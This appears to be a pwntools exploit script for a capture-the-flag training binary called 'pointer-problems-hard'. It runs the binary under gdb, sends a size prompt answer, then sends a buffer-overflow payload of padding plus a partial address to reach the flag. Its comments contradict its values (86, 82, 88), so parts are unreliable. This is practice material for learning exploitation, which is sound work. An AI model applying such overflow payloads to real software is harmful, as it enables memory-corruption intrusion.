from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug("/challenge/pointer-problems-hard", gdbscript = '''
set logging enable on
break *challenge+230
x/8bx $rsi
c
''')


# Now the process should continue to the prompt
#output = p.recvall().decode()
output = p.recvuntil(b"Payload size: ").decode()
print("Received prompt")

# The GDB output with the password bytes should be in the output
print("GDB output:", output)

# Calculate size needed (always 86)
size_needed = 82

# Send the size
p.sendline(str(size_needed).encode())

# Continue with the challenge
output = p.recvuntil(b"Send your payload").decode()
print("Received prompt")
print("GDB output:", output)

# Get the password bytes from user input
#flag_addr = input("\nEnter the flag address you observed: ").strip()

#flag_addr_bytes = bytes.fromhex(flag_addr)

#print(f"sending password: {flag_addr_bytes.hex()}")
payload = b'A' * 88 + b'\x40\xc0\x00\x00' #flag_addr_bytes

p.send(payload)

# Try to get the result
try:
    output = p.recvall().decode()
    print("Result:", output)
except:
    print("No result received, switching to interactive...")
    p.interactive()
